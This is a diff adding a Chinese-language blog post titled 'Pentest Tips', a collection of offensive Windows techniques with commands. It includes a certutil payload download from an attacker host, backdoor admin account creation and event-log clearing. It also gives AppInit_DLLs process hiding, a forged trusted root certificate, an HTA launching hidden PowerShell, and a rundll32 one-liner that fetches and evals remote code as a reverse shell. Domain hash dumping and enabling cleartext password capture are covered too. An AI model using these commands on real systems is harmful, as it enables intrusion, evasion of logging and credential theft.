@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          Pentest Tips - Rootclay
+        
+    </title>
+
+    <link rel="canonical" href="http://rootclay.github.io/2017/09/05/Tips/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('header.png')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                            
+                        </div>
+                        <h1>Pentest Tips</h1>
+                        <h2 class="subheading">Pentest Tips.</h2>
+                        <span class="meta">
+                            Posted by Rootclay on
+                            2017-09-05
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">ROOTCLAY</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h2 id="pentest-and-development-tips">Pentest-and-Development-Tips</h2>
+<p>A collection of pentest and development tips</p>
+<p>Author： 3gstudent</p>
+<h3 id="tips-1-手动端口探测">Tips 1. 手动端口探测</h3>
+<p>nmap的-sV可以探测出服务版本，但有些情况下必须手动探测去验证</p>
+<p>使用Wireshark获取响应包未免大材小用，可通过nc简单判断</p>
+<p>eg.</p>
+<p>对于8001端口，nc连接上去，随便输入一个字符串，得到了以下结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ nc -vv localhost 8001  </div><div class="line">localhost [127.0.0.1] 8001 (?) open</div><div class="line">asd</div><div class="line">HTTP/1.1 400 Bad Request</div><div class="line">Date: Fri, 25 Aug 2017 12:15:25 GMT</div><div class="line">Server: Apache/2.4.23 (Debian)</div><div class="line">Content-Length: 301</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=iso-8859-1</div><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</div><div class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</div><div class="line">&lt;/p&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;address&gt;Apache/2.4.23 (Debian) Server at 127.0.0.1 Port 8001&lt;/address&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>由此我们知道了这是一个http服务，因为我们发送的字符串不是一个合法的HTTP请求，因此返回一个400 Bad requests，我们还得到了系统的版本是Debian，WebServer是Apache</p>
+<p>参考：</p>
+<p><a href="http://www.freebuf.com/articles/network/146087.html" target="_blank" rel="external">《谈谈端口探测的经验与原理》</a></p>
+<hr>
+<h3 id="tips-2-windows系统从kali下载文件">Tips 2. Windows系统从Kali下载文件</h3>
+<p>Kali:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 80</div></pre></td></tr></table></figure>
+<p>Windows:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 1.exe</div><div class="line">certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/" target="_blank" rel="external">《渗透测试中的certutil.exe》</a></p>
+<hr>
+<h3 id="tips-3-配置工作组计算机使其支持net-use远程连接">Tips 3. 配置工作组计算机,使其支持net use远程连接</h3>
+<p>添加用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user test test /add</div><div class="line">net localgroup administrators test /add</div></pre></td></tr></table></figure>
+<p>修改注册表，使其支持远程连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1</div></pre></td></tr></table></figure>
+<p>net use远程连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net use \\192.168.1.195 test /u:test</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="tips-4-windows日志清除">Tips 4. Windows日志清除</h3>
+<p>获取日志分类列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wevtutil el &gt;1.txt</div></pre></td></tr></table></figure>
+<p>获取单个日志类别的统计信息：</p>
+<p>eg.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wevtutil gli &quot;windows powershell&quot;</div></pre></td></tr></table></figure>
+<p>回显：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">creationTime: 2016-11-28T06:01:37.986Z</div><div class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</div><div class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</div><div class="line">fileSize: 1118208</div><div class="line">attributes: 32</div><div class="line">numberOfLogRecords: 1228</div><div class="line">oldestRecordNumber: 1</div></pre></td></tr></table></figure>
+<p>查看指定日志的具体内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wevtutil qe /f:text &quot;windows powershell&quot;</div></pre></td></tr></table></figure>
+<p>删除单个日志类别的所有信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wevtutil cl &quot;windows powershell&quot;</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="external">《渗透技巧-Windows日志的删除与绕过》</a></p>
+<hr>
+<h3 id="tips-5-破坏windows日志记录功能">Tips 5. 破坏Windows日志记录功能</h3>
+<p>通过调用TerminateThread结束实现日志功能的线程，使得日志记录功能失效，但Windows Event Log服务没有被破坏，状态仍为正在运行</p>
+<p>Powershell:</p>
+<p><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="external">https://github.com/hlldz/Invoke-Phant0m</a></p>
+<p>C++:</p>
+<p><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="external">https://github.com/3gstudent/Windwos-EventLog-Bypass</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="external">《渗透技巧-Windows日志的删除与绕过》</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87/" target="_blank" rel="external">《利用API-NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过》</a></p>
+<hr>
+<h3 id="tips-6-win7和windows-server-2008-r2下的进程隐藏">Tips 6. Win7和Windows Server 2008 R2下的进程隐藏</h3>
+<p>利用globalAPIhooks，通过修改注册表实现</p>
+<p>下载工程：<a href="https://github.com/subTee/AppInitGlobalHooks-Mimikatz" target="_blank" rel="external">https://github.com/subTee/AppInitGlobalHooks-Mimikatz</a></p>
+<p>修改代码指定要隐藏的程序名cldr.exe，编译成cldr.dll，cldr.dll放在<code>C:\ProgramData\Microsoft\HelpLibrary\</code></p>
+<p>管理员权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0</div><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f</div><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v AppInit_DLLs /t REG_SZ /d &quot;C:\\ProgramData\\Microsoft\\HelpLibrary\\cldr.dll&quot; /f</div></pre></td></tr></table></figure>
+<p>此时，任务管理器进程列表不存在cldr.exe，Process Explorer不存在cldr.exe，Tasklist.exe不存在cldr.exe</p>
+<p>对于64位系统：</p>
+<p>管理员权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0</div><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f</div><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v AppInit_DLLs /t REG_SZ /d &quot;C:\\ProgramData\\Microsoft\\HelpLibrary\\cldrx64.dll&quot; /f</div><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0</div><div class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f</div><div class="line">reg add &quot;hklm\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows&quot; /v AppInit_DLLs /t REG_SZ /d &quot;C:\\ProgramData\\Microsoft\\HelpLibrary\\cldr.dll&quot; /f</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8globalAPIhooks%E5%9C%A8Win7%E7%B3%BB%E7%BB%9F%E4%B8%8B%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" target="_blank" rel="external">《利用globalAPIhooks在Win7系统下隐藏进程》</a></p>
+<hr>
+<h3 id="tips-7-同名exe和com文件执行顺序">Tips 7. 同名exe和com文件执行顺序</h3>
+<p>如果一个路径下同时包含同名的exe和com文件，<a href="http://xn--test-zu6fx14c.xn--exetest-bs4l.com" target="_blank" rel="external">例如test.exe和test.com</a>，通过命令行cmd输入test(不包含文件后缀名)，会优先运行com文件，<a href="http://xn--test-ux0g.com" target="_blank" rel="external">即test.com</a></p>
+<p>而COM文件的生成只需要把exe文件的后缀名改为com即可</p>
+<p>参考：</p>
+<p>《A dirty way of tricking users to bypass UAC》</p>
+<hr>
+<h3 id="tips-8-windows系统证书生成与注册">Tips 8. Windows系统证书生成与注册</h3>
+<p>证书生成与签名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">makecert -n &quot;CN=Microsoft Windows&quot; -r -sv Root.pvk Root.cer -b 01/30/2016 -e 01/01/2019</div><div class="line">cert2spc Root.cer Root.spc</div><div class="line">pvk2pfx -pvk Root.pvk -pi test -spc Root.spc -pfx Root.pfx -f</div><div class="line">signtool sign /f Root.pfx /p test test.exe</div></pre></td></tr></table></figure>
+<p>执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件，test.exe被加上数字签名</p>
+<p>证书注册：</p>
+<p>管理员权限cmd，将证书添加到localmachine：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">certmgr.exe -add -c RootIssuer.cer -s -r localmachine root</div><div class="line">certmgr.exe -add -c ChildSubject.cer -s -r localmachine root</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《A dirty way of tricking users to bypass UAC》</p>
+<hr>
+<h3 id="tips-9-hta执行vbs加载powershell">Tips 9.  hta执行vbs，加载powershell</h3>
+<p>test.hta：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;HTML&gt; </div><div class="line">&lt;HEAD&gt; </div><div class="line">&lt;script language=&quot;VBScript&quot;&gt;</div><div class="line">    Set WshShell = CreateObject(&quot;WScript.Shell&quot;)</div><div class="line">    Connect=&quot;powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA==&quot;</div><div class="line">    WshShell.Run Connect, 4, true</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;HTA:APPLICATION ID=&quot;test&quot;</div><div class="line">WINDOWSTATE = &quot;minimize&quot;&gt;</div><div class="line">&lt;/HEAD&gt; </div><div class="line">&lt;BODY&gt; </div><div class="line">&lt;/BODY&gt; </div><div class="line">&lt;/HTML&gt;</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《Bypass McAfee Application Control——Code Execution》</p>
+<hr>
+<h3 id="tips-10-通过c编写dll-amp-通过rundll32exe或者regsvr32加载dll">Tips 10. 通过c#编写dll &amp; 通过rundll32.exe或者regsvr32加载dll</h3>
+<p>默认情况下，c#不可以声明导出函数，但可通过添加UnmanagedExports实现</p>
+<p>当然，通过c#编写的dll，dll需要在对应版本的.NET环境才能正常运行，通过c++编写的dll更加通用</p>
+<p>通过rundll32.exe或者regsvr32能够加载dll，但要求dll包含特定的导出函数</p>
+<p>参考：</p>
+<p>《Code Execution of Regsvr32.exe》</p>
+<hr>
+<h3 id="tips-11-windows下cpl文件介绍">Tips 11. Windows下cpl文件介绍</h3>
+<p>本质上是DLL文件，后缀名为cpl，包含一个导出函数CPLApplet(c实现可不指定)</p>
+<p>执行方法：</p>
+<p>(1)双击直接运行</p>
+<p>(2)cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rundll32 shell32.dll,Control_RunDLL test.cpl</div></pre></td></tr></table></figure>
+<p>(3)cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">control test.cpl</div></pre></td></tr></table></figure>
+<p>(4)vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Dim obj</div><div class="line">Set obj = CreateObject(&quot;Shell.Application&quot;)</div><div class="line">obj.ControlPanelItem(&quot;test.cpl&quot;)</div></pre></td></tr></table></figure>
+<p>(5)js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var a = new ActiveXObject(&quot;Shell.Application&quot;);</div><div class="line">a.ControlPanelItem(&quot;c:\\test\\test.cpl&quot;);</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《CPL文件利用介绍》</p>
+<hr>
+<h3 id="tips-12-windows下通过cmd调用rundll32执行一段代码弹回shell">Tips 12. Windows下通过cmd调用rundll32执行一段代码弹回Shell</h3>
+<p>Server:</p>
+<p><a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="external">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p>
+<p>Client:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w=new%20ActiveXObject(&quot;WScript.Shell&quot;);try&#123;v=w.RegRead(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer&quot;);q=v.split(&quot;=&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(&quot;GET&quot;,&quot;http://192.168.174.131/connect&quot;,false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</div></pre></td></tr></table></figure>
+<p>当然，该RAT工具还可通过以下方法加载：</p>
+<p>vbs，js，exe，dll，shellcode</p>
+<p>参考：</p>
+<p>《JavaScript Backdoor》</p>
+<p>《JavaScript Phishing》</p>
+<hr>
+<h3 id="tips-13-可通过内存dump还原出puttyamppageant的密钥">Tips 13. 可通过内存dump还原出putty&amp;pageant的密钥</h3>
+<p>windows和Linux均适用</p>
+<p>参考：</p>
+<p>《Memory Dump利用实例》</p>
+<hr>
+<h3 id="tips-14-针对visual-studio的钓鱼利用">Tips 14. 针对Visual Studio的钓鱼利用</h3>
+<p>Visual C++：</p>
+<ul>
+<li>修改.vcxproj文件</li>
+</ul>
+<p>Visual Basic：</p>
+<ul>
+<li>修改.vbproj文件</li>
+</ul>
+<p>Visual F#：</p>
+<ul>
+<li>修改.fsproj文件</li>
+</ul>
+<p>使用Visual Studio对以上任一工程编译时，能够执行任意代码</p>
+<p>参考：</p>
+<p>《Pay close attention to your download code——Visual Studio trick to run code when building》</p>
+<hr>
+<h3 id="tips-15-32位程序在64位windows系统下执行的时候如果有对注册表和文件的操作存在重定向">Tips 15. 32位程序在64位Windows系统下执行的时候，如果有对注册表和文件的操作，存在重定向</h3>
+<p>对注册表操作：</p>
+<p>访问HKLM\Software\的实际路径为HKLM\Software\Wow6432Node\</p>
+<p>对文件操作：</p>
+<p>访问c:\windows\Sysnative\ 的实际路径为 c:\windows\system32<br>
+访问c:\windows\system32\ 的实际路径为 c:\windows\SysWOW64\</p>
+<p>参考：</p>
+<p>《关于32位程序在64位系统下运行中需要注意的重定向问题》</p>
+<hr>
+<h3 id="tips-16-获取windows域控所有用户hash">Tips 16. 获取Windows域控所有用户hash</h3>
+<h4 id="方法1">方法1：</h4>
+<p>复制ntds.dit：</p>
+<p>使用NinjaCopy，<a href="https://github.com/3gstudent/NinjaCopy" target="_blank" rel="external">https://github.com/3gstudent/NinjaCopy</a></p>
+<p>导出hash：</p>
+<p>使用quarkspwdump，<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external">https://github.com/quarkslab/quarkspwdump</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">esentutl /p /o ntds.dit</div><div class="line">QuarksPwDump.exe -dhb -hist -nt c：\test\ntds.dit -o c：\test\log.txt</div></pre></td></tr></table></figure>
+<h4 id="方法2">方法2：</h4>
+<p>使用powershell：DSInternals PowerShell Module</p>
+<p><a href="https://www.dsinternals.com/wp-content/uploads/DSInternals_v2.8.zip" target="_blank" rel="external">https://www.dsinternals.com/wp-content/uploads/DSInternals_v2.8.zip</a></p>
+<p>适用条件：</p>
+<p>Windows PowerShell 3.0 or 3.0+</p>
+<p>.NET Framework 4.0 or 4.0+</p>
+<p>参考：</p>
+<p>《导出当前域内所有用户hash的技术整理》</p>
+<p>《利用Powershell快速导出域控所有用户Hash》</p>
+<hr>
+<h3 id="tips-17-导出windows系统明文口令">Tips 17. 导出Windows系统明文口令</h3>
+<p>Windows Server 2012默认无法使用mimikatz导出明文口令，部分Windows Server 2008也一样</p>
+<p>解决方法：启用Wdigest Auth</p>
+<p>cmd:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>
+<p>or</p>
+<p>powershell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</div></pre></td></tr></table></figure>
+<p>重启或者用户再次登录，能够导出明文口令</p>
+<p>参考：</p>
+<p>《域渗透——Dump Clear-Text Password after KB2871997 installed》</p>
+<hr>
+<h3 id="tips-18-可通过hook-passwordchangenotify实时记录域控管理员的新密码">Tips 18. 可通过Hook PasswordChangeNotify实时记录域控管理员的新密码</h3>
+<p>当然，可选择保存在本地或是将密码上传至服务器</p>
+<p>参考：</p>
+<p>《域渗透——Hook PasswordChangeNotify》</p>
+<hr>
+<h3 id="tips-19-在域渗透时要记得留意域内主机的本地管理员账号">Tips 19. 在域渗透时要记得留意域内主机的本地管理员账号</h3>
+<p>如果管理员疏忽，域内主机使用相同的本地管理员账号，可以通过pass-the-hash远程登录域内其他主机</p>
+<p>参考：</p>
+<p>《域渗透——Local Administrator Password Solution》</p>
+<hr>
+<h3 id="tips-20-通过powershell获取dll的导出函数">Tips 20. 通过powershell获取dll的导出函数</h3>
+<p><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1" target="_blank" rel="external">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-Exports -DllPath c:\Windows\system32\dimsjob.dll -ExportsToCpp C:\test\export.txt</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.3(Use-odbcconf-to-load-dll-&amp;-Get-Exports-&amp;-ETW-USB-Keylogger)/" target="_blank" rel="external">《Study Notes Weekly No.3(Use odbcconf to load dll &amp; Get-Exports &amp; ETW USB Keylogger)》</a></p>
+<hr>
+<h3 id="tips-21-快捷方式的参数隐藏技巧">Tips 21. 快捷方式的参数隐藏技巧</h3>
+<p>将payload放置在260个空字符之后，这样无法在文件属性查看payload，可以用来在快捷方式中隐藏payload，欺骗用户点击，隐蔽执行代码</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">《渗透技巧——快捷方式文件的参数隐藏技巧》</a></p>
+<hr>
+<h3 id="tips-22-32位程序能够对64位进程进行远程注入">Tips 22. 32位程序能够对64位进程进行远程注入</h3>
+<p>POC：</p>
+<p><a href="https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThread32to64.cpp" target="_blank" rel="external">https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThread32to64.cpp</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%AF%B964%E4%BD%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">《32位程序对64位进程的远程注入实现》</a></p>
+<hr>
+<h3 id="tips-23-system权限的进程在某些情况下需要进行降权">Tips 23. system权限的进程在某些情况下需要进行降权</h3>
+<p>使用sytem权限的进程可能会遇到以下问题:</p>
+<p>1.无法获得当前用户的文件内容</p>
